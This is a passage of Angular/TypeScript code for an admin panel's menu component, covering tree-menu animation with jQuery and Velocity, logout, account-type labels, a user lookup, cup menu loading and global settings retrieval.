      });
//
      // Set mtree-active class on list items for last opened element
      $('.mtree li > *:first-child').on('click.mtree-active', function (e) {
        if ($(this).parent().hasClass('mtree-closed')) {
          $('.mtree-active').not($(this).parent()).removeClass('mtree-active');
          $(this).parent().addClass('mtree-active');
        } else if ($(this).parent().hasClass('mtree-open')) {
          $(this).parent().removeClass('mtree-active');
        } else {
          $('.mtree-active').not($(this).parent()).removeClass('mtree-active');
          $(this).parent().toggleClass('mtree-active');
        }
      });
//
//
      // Set node click elements, preferably <a> but node links can be <span> also
      node.children(':first-child').on('click.mtree', function (e) {
//
        // element vars
        var el = $(this).parent().children('ul').first();
        var isOpen = $(this).parent().hasClass('mtree-open');
//
        // close other elements on same level if opening
        if ((close_same_level || $('.csl').hasClass('active')) && !isOpen) {
          var close_items = $(this).closest('ul').children('.mtree-open').not($(this).parent()).children('ul');
//
          // Velocity.js
          if ($.Velocity) {
            close_items.velocity({
              height: 0
            }, {
              duration: duration,
              easing: easing,
              display: 'none',
              delay: 100,
              complete: function () {
                setNodeClass($(this).parent(), true)
              }
            });
//
            // jQuery fallback
          } else {
            close_items.delay(100).slideToggle(duration, function () {
              setNodeClass($(this).parent(), true);
            });
          }
        }
//
        // force auto height of element so actual height can be extracted
        el.css({ 'height': 'auto' });
//
        // listAnim: animate child elements when opening
        if (!isOpen && $.Velocity && listAnim) el.find(' > li, li.mtree-open > ul > li').css({ 'opacity': 0 }).velocity('stop').velocity('list');
//
        // Velocity.js animate element
        if ($.Velocity) {
          el.velocity('stop').velocity({
            //translateZ: 0, // optional hardware-acceleration is automatic on mobile
            height: isOpen ? [0, el.outerHeight()] : [el.outerHeight(), 0]
          }, {
            queue: false,
            duration: duration,
            easing: easing,
            display: isOpen ? 'none' : 'block',
            begin: setNodeClass($(this).parent(), isOpen),
            complete: function () {
              if (!isOpen) $(this).css('height', 'auto');
            }
          });
//
          // jQuery fallback animate element
        } else {
          setNodeClass($(this).parent(), isOpen);
          el.slideToggle(duration);
        }
//
        // We can't have nodes as links unfortunately
        e.preventDefault();
      });
//
      // Function for updating node class
      function setNodeClass(el, isOpen) {
        if (isOpen) {
          el.removeClass('mtree-open').addClass('mtree-closed');
        } else {
          el.removeClass('mtree-closed').addClass('mtree-open');
        }
//
      }
//
      // List animation sequence
      if ($.Velocity && listAnim) {
        $.Velocity.Sequences.list = function (element, options, index, size) {
          $.Velocity.animate(element, {
            opacity: [1, 0],
            translateY: [0, -(index + 1)]
          }, {
            delay: index * (duration / size / 2),
            duration: duration,
            easing: easing
          });
        };
      }
//
      // Fade in mtree after classes are added.
      // Useful if you have set collapsed = true or applied styles that change the structure so the menu doesn't jump between states after the function executes.
      if ($('.mtree').css('opacity') == 0) {
        if ($.Velocity) {
          $('.mtree').css('opacity', 1).children().css('opacity', 0).velocity('list');
        } else {
          $('.mtree').show(200);
        }
      }
    }
  }

  logout() {
    let payload = {
      user_id: new User().getData().user_id,
      tokan: new User().getToken()
    }
    this.auth.logout(payload).subscribe((res) => {
      if (res?.status) {
        this.route.navigate(['/login']);
        // localStorage.clear();
        localStorage.removeItem('admintoken');
        localStorage.removeItem('useradmininfo');

      }
    })
  }

  getAcType(id) {
    if (id == '1') {
      return 'Tech Admin'
    } else if (id == '2') {
      return 'Super Admin'
    } else if (id == '3') {
      return 'Admin'
    } else if (id == '4') {
      return 'Super Master'
    } else if (id == '5') {
      return 'Master'
    }else if (id == '6') {
      return 'Agent'
    }else if (id == '7') {
      return 'User'
    }

  }
onLogo(){
  this.route.navigate(['/main/listOfclients', 'undefined']);
  setTimeout(() => {
    window.location.reload();
  }, 500);


}
  getUserDetails() {
    let payload = {
      user_name: this.searchKey.value
    }
    this.userservice.getUserDetailsbyName(payload).subscribe((res) => {
      if (res?.status) {
        this.userDetails = res?.data;
      }
    })
  }


  getCupsForMenu(){

    this.service.getCupsForMenu().subscribe((res)=>{
      // console.log(res , "cup")

      if(res?.status){
      this.sportListCup = res?.data;
      // console.log(this.sportListCup , "cup")
      }
    })
  }
  ngOnDestroy(): void{
  }



  getGlobalSetting(){
    this.service.getGlobalSettings().subscribe((res)=>{
      if(res?.status){
        console.log("res",res)
        this.gloabalData = res?.data
        this.isPaymentShow = res?.data?.payment_gateway || '0'

         this.url = environment.APIEndpoint + '/api/upload/image/' + this.gloabalData.logo ;
        //  this.favurl = environment.APIEndpoint + '/api/upload/image/' + this.gloabalData.favicon ;
      }
      else{
        this.toaster.error(res?.message)
      }
    })
  }
}

